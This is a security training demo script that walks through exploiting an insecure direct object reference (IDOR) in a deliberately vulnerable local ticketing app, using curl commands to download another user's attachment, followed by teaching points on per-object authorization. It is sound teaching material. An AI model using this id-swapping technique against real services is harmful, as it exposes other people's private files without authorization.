# Demo 03: IDOR — download another user’s attachment (`GET /api/attachments/{id}/download`)

Goal: show how IDOR applies to *files* and not just “records”.

## Prereqs

- TrustyTickets running (see `00-setup-trustytickets.md`)
- You have `bob.cookies` (logged in as Bob)

```bash
export TT_BASE="http://localhost:5005"
```

---

## 1) Identify an attachment id

Seed data includes one attachment (id `1`) on ticket `1` (Alice’s ticket).

You can confirm by calling the ticket endpoint:

```bash
curl -s -b bob.cookies "$TT_BASE/api/tickets/1"
```

Look for:

```json
"attachments":[{"id":1, ... }]
```

---

## 2) Download the attachment as the “wrong” user

```bash
curl -i -s -b bob.cookies "$TT_BASE/api/attachments/1/download"
```

Expected result:

- HTTP `200 OK`
- A file download response (headers + content) for an attachment Bob should not be able to access.

Talking points:

- If this were a real system, attachments might be invoices, IDs, contracts, medical records…
- “The record is protected” isn’t enough if the file download endpoint isn’t.

---

## 3) Key takeaway (say this)

IDOR checks must be applied consistently:

- Tickets, comments, attachments, exports, reports…
- Any endpoint that takes an id must enforce **authorization** for that specific object.

